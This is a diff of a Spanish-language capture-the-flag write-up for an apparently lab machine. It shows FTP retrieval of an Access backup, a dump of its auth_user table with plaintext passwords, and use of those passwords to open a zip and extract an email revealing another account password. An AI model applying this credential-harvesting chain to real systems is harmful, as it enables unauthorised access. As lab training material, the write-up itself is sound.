+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#ff0;font-weight:bold">200</span> PORT <span style="color:#fff;font-weight:bold">command</span> successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#ff0;font-weight:bold">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>08-23-18  09:16PM              <span style="color:#ff0;font-weight:bold">5652480</span> backup.mdb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#ff0;font-weight:bold">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>ftp&gt; get backup.mdb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>local: backup.mdb remote: backup.mdb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#ff0;font-weight:bold">200</span> PORT <span style="color:#fff;font-weight:bold">command</span> successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#ff0;font-weight:bold">125</span> Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>100% |*********************************************|  <span style="color:#ff0;font-weight:bold">5520</span> KiB    2.28 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#ff0;font-weight:bold">226</span> Transfer complete.</span></span></code></pre></div>
+<p>Y ahora sí que tengo los archivos íntegros.</p>
 <p>Vemos que la base de datos de access tiene muchas tablas</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mdb-tables backup.mdb 
-</span></span><span style="display:flex;"><span>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
-</span></span></code></pre></div><p>Vemos una tabla que me llama la atención, <code>auth_user</code> que contiene credenciales.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mdb-json backup.mdb auth_user
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:25,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;Status&#34;</span>:1,<span style="color:#e6db74">&#34;last_login&#34;</span>:<span style="color:#e6db74">&#34;08/23/18 21:11:47&#34;</span>,<span style="color:#e6db74">&#34;RoleID&#34;</span>:26<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:27,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;engineer&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;access4u@security&#34;</span>,<span style="color:#e6db74">&#34;Status&#34;</span>:1,<span style="color:#e6db74">&#34;last_login&#34;</span>:<span style="color:#e6db74">&#34;08/23/18 21:13:36&#34;</span>,<span style="color:#e6db74">&#34;RoleID&#34;</span>:26<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;id&#34;</span>:28,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;backup_admin&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;Status&#34;</span>:1,<span style="color:#e6db74">&#34;last_login&#34;</span>:<span style="color:#e6db74">&#34;08/23/18 21:14:02&#34;</span>,<span style="color:#e6db74">&#34;RoleID&#34;</span>:26<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p><code>engineer:access4u@security</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ mdb-tables backup.mdb 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx</span></span></code></pre></div>
+<p>Vemos una tabla que me llama la atención, <code>auth_user</code> que contiene credenciales.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ mdb-json backup.mdb auth_user
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>:25,<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;Status&#34;</span>:1,<span style="color:#0ff;font-weight:bold">&#34;last_login&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;08/23/18 21:11:47&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;RoleID&#34;</span>:26}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>{<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>:27,<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;engineer&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;access4u@security&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;Status&#34;</span>:1,<span style="color:#0ff;font-weight:bold">&#34;last_login&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;08/23/18 21:13:36&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;RoleID&#34;</span>:26}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>{<span style="color:#0ff;font-weight:bold">&#34;id&#34;</span>:28,<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;backup_admin&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;Status&#34;</span>:1,<span style="color:#0ff;font-weight:bold">&#34;last_login&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;08/23/18 21:14:02&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;RoleID&#34;</span>:26}</span></span></code></pre></div>
+<p><code>engineer:access4u@security</code></p>
 <p>¿Ahora bien, como uso estas credenciales?
 En el FTP no he podido utilizar ninguna de las dos cuentas.</p>
 <h1 id="foothold">Foothold</h1>
 <p>El archivo .zip está protegido con contraseña.</p>
 <p>Y si utilizamos la credencial encontrada..</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Enter password <span style="color:#f92672">(</span>will not be echoed<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>Everything is Ok         
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Size:       <span style="color:#ae81ff">271360</span>
-</span></span><span style="display:flex;"><span>Compressed: <span style="color:#ae81ff">10870</span>
-</span></span></code></pre></div><p>Tiene un archivo <code>Access Control.pst</code>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>Enter password (will not be echoed):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Everything is Ok         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Size:       <span style="color:#ff0;font-weight:bold">271360</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Compressed: <span style="color:#ff0;font-weight:bold">10870</span></span></span></code></pre></div>
+<p>Tiene un archivo <code>Access Control.pst</code>
 Estos archivos son una tabla de almacenamiento que se utiliza para almacenar copias de mensajes, calendarios&hellip; Por lo cual podría contener información sensible..</p>
 <p>Vamos a instalar un paquete llamado <code>pst-utils</code> para poder jugar con este archivo.
 <code>$ sudo apt-get install pst-utils -y</code></p>
 <p>Ahora con <code>readpst</code> podemos conseguir un archivo .mbox que son mensajes que podríamos leer.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ readpst Access<span style="color:#ae81ff">\ </span>Control.pst
-</span></span><span style="display:flex;"><span>Opening PST file and indexes...
-</span></span><span style="display:flex;"><span>Processing Folder <span style="color:#e6db74">&#34;Deleted Items&#34;</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Access Control&#34;</span> - <span style="color:#ae81ff">2</span> items <span style="color:#66d9ef">done</span>, <span style="color:#ae81ff">0</span> items skipped.
-</span></span></code></pre></div><p>Nos devuelve el archivo <code>Access Control.mbox</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat <span style="color:#e6db74">&#34;Access Control.mbox&#34;</span>
-</span></span><span style="display:flex;"><span>From <span style="color:#e6db74">&#34;john@megacorp.com&#34;</span> Fri Aug <span style="color:#ae81ff">24</span> 01:44:07 <span style="color:#ae81ff">2018</span>
-</span></span><span style="display:flex;"><span>Status: RO
-</span></span><span style="display:flex;"><span>From: john@megacorp.com &lt;john@megacorp.com&gt;
-</span></span><span style="display:flex;"><span>Subject: MegaCorp Access Control System <span style="color:#e6db74">&#34;security&#34;</span> account
-</span></span><span style="display:flex;"><span>To: <span style="color:#e6db74">&#39;security@accesscontrolsystems.com&#39;</span>
-</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">23</span> Aug <span style="color:#ae81ff">2018</span> 23:44:07 +0000
-</span></span><span style="display:flex;"><span>MIME-Version: 1.0
-</span></span><span style="display:flex;"><span>Content-Type: multipart/mixed;
-</span></span><span style="display:flex;"><span>	boundary<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--boundary-LibPST-iamunique-1304609787_-_-&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>----boundary-LibPST-iamunique-1304609787_-_-
-</span></span><span style="display:flex;"><span>Content-Type: multipart/alternative;
-</span></span><span style="display:flex;"><span>	boundary<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alt---boundary-LibPST-iamunique-1304609787_-_-&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>--alt---boundary-LibPST-iamunique-1304609787_-_-
-</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Hi there,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>The password <span style="color:#66d9ef">for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Regards,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>John
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>--alt---boundary-LibPST-iamunique-1304609787_-_-
-</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;us-ascii&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;html xmlns:v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:vml&#34;</span> xmlns:o<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:office:office&#34;</span> xmlns:w<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:office:word&#34;</span> xmlns:m<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/office/2004/12/omml&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/TR/REC-html40&#34;</span>&gt;&lt;head&gt;&lt;meta http-equiv<span style="color:#f92672">=</span>Content-Type content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=us-ascii&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span>Generator content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Microsoft Word 15 (filtered medium)&#34;</span>&gt;&lt;style&gt;&lt;!--
-</span></span><span style="display:flex;"><span>/* Font Definitions */
-</span></span><span style="display:flex;"><span>@font-face
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>font-family:<span style="color:#e6db74">&#34;Cambria Math&#34;</span>;
-</span></span><span style="display:flex;"><span>	panose-1:0 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 0;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>@font-face
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>font-family:Calibri;
-</span></span><span style="display:flex;"><span>	panose-1:2 <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2</span> 4;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>/* Style Definitions */
-</span></span><span style="display:flex;"><span>p.MsoNormal, li.MsoNormal, div.MsoNormal
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>margin:0in;
-</span></span><span style="display:flex;"><span>	margin-bottom:.0001pt;
-</span></span><span style="display:flex;"><span>	font-size:11.0pt;
-</span></span><span style="display:flex;"><span>	font-family:<span style="color:#e6db74">&#34;Calibri&#34;</span>,sans-serif;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>a:link, span.MsoHyperlink
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>mso-style-priority:99;
-</span></span><span style="display:flex;"><span>	color:#0563C1;
-</span></span><span style="display:flex;"><span>	text-decoration:underline;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>a:visited, span.MsoHyperlinkFollowed
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>mso-style-priority:99;
-</span></span><span style="display:flex;"><span>	color:#954F72;
-</span></span><span style="display:flex;"><span>	text-decoration:underline;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>p.msonormal0, li.msonormal0, div.msonormal0
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>mso-style-name:msonormal;
-</span></span><span style="display:flex;"><span>	mso-margin-top-alt:auto;
-</span></span><span style="display:flex;"><span>	margin-right:0in;
-</span></span><span style="display:flex;"><span>	mso-margin-bottom-alt:auto;
-</span></span><span style="display:flex;"><span>	margin-left:0in;
-</span></span><span style="display:flex;"><span>	font-size:11.0pt;
-</span></span><span style="display:flex;"><span>	font-family:<span style="color:#e6db74">&#34;Calibri&#34;</span>,sans-serif;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>span.EmailStyle18
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>mso-style-type:personal-compose;
-</span></span><span style="display:flex;"><span>	font-family:<span style="color:#e6db74">&#34;Calibri&#34;</span>,sans-serif;
-</span></span><span style="display:flex;"><span>	color:windowtext;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>.MsoChpDefault
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>mso-style-type:export-only;
-</span></span><span style="display:flex;"><span>	font-size:10.0pt;
-</span></span><span style="display:flex;"><span>	font-family:<span style="color:#e6db74">&#34;Calibri&#34;</span>,sans-serif;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>@page WordSection1
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>size:8.5in 11.0in;
-</span></span><span style="display:flex;"><span>	margin:1.0in 1.0in 1.0in 1.0in;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>div.WordSection1
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">{</span>page:WordSection1;<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>--&gt;&lt;/style&gt;&lt;!--<span style="color:#f92672">[</span><span style="color:#66d9ef">if</span> gte mso 9<span style="color:#f92672">]</span>&gt;&lt;xml&gt;
-</span></span><span style="display:flex;"><span>&lt;o:shapedefaults v:ext<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edit&#34;</span> spidmax<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1026&#34;</span> /&gt;
-</span></span><span style="display:flex;"><span>&lt;/xml&gt;&lt;!<span style="color:#f92672">[</span>endif<span style="color:#f92672">]</span>--&gt;&lt;!--<span style="color:#f92672">[</span><span style="color:#66d9ef">if</span> gte mso 9<span style="color:#f92672">]</span>&gt;&lt;xml&gt;
-</span></span><span style="display:flex;"><span>&lt;o:shapelayout v:ext<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edit&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;o:idmap v:ext<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edit&#34;</span> data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> /&gt;
-</span></span><span style="display:flex;"><span>&lt;/o:shapelayout&gt;&lt;/xml&gt;&lt;!<span style="color:#f92672">[</span>endif<span style="color:#f92672">]</span>--&gt;&lt;/head&gt;&lt;body lang<span style="color:#f92672">=</span>EN-US link<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#0563C1&#34;</span> vlink<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#954F72&#34;</span>&gt;&lt;div class<span style="color:#f92672">=</span>WordSection1&gt;&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;Hi there,&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class<span style="color:#f92672">=</span>MsoNormal&gt;The password <span style="color:#66d9ef">for</span> the &amp;<span style="color:#75715e">#8220;security&amp;#8221; account has been changed to 4Cc3ssC0ntr0ller.&amp;nbsp; Please ensure this is passed on to your engineers.&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;Regards,&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;John&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span>
-</span></span><span style="display:flex;"><span>--alt---boundary-LibPST-iamunique-1304609787_-_---
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>----boundary-LibPST-iamunique-1304609787_-_---
-</span></span></code></pre></div><p>Podemos leer una credencial de este archivo.
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ readpst Access<span style="color:#0ff;font-weight:bold">\ </span>Control.pst
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Opening PST file and indexes...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Processing Folder <span style="color:#0ff;font-weight:bold">&#34;Deleted Items&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>	<span style="color:#0ff;font-weight:bold">&#34;Access Control&#34;</span> - <span style="color:#ff0;font-weight:bold">2</span> items <span style="color:#fff;font-weight:bold">done</span>, <span style="color:#ff0;font-weight:bold">0</span> items skipped.</span></span></code></pre></div>
+<p>Nos devuelve el archivo <code>Access Control.mbox</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ cat <span style="color:#0ff;font-weight:bold">&#34;Access Control.mbox&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>From <span style="color:#0ff;font-weight:bold">&#34;john@megacorp.com&#34;</span> Fri Aug <span style="color:#ff0;font-weight:bold">24</span> 01:44:07 <span style="color:#ff0;font-weight:bold">2018</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Status: RO
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>From: john@megacorp.com &lt;john@megacorp.com&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Subject: MegaCorp Access Control System <span style="color:#0ff;font-weight:bold">&#34;security&#34;</span> account
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>To: <span style="color:#0ff;font-weight:bold">&#39;security@accesscontrolsystems.com&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>Date: Thu, <span style="color:#ff0;font-weight:bold">23</span> Aug <span style="color:#ff0;font-weight:bold">2018</span> 23:44:07 +0000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>MIME-Version: 1.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Content-Type: multipart/mixed;
